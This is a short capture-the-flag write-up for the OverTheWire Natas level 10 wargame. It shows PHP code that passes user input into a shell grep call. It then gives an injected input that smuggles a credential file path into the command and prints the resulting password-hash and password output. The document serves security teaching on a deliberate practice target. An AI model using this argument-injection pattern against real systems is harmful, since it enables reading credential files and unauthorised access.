# Natas 10 Solution

It appears that the only difference between this level and the last is
that the characters `;` and `&` are filtered.

http://natas10.natas.labs.overthewire.org/index-source.html:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This means that we must ust the grep function to find the solution.
Fourtunately, grep allows wildcards in it's search term. We can search 
for `.*`(this will match anything) in the password file, 
and use a hashtag to comment out the `dictionary.txt`.


Submitting `.* /etc/natas_webpass/natas11 #` yields:
```
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

The last line contains our password.

**Username: natas11**  
**Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK**

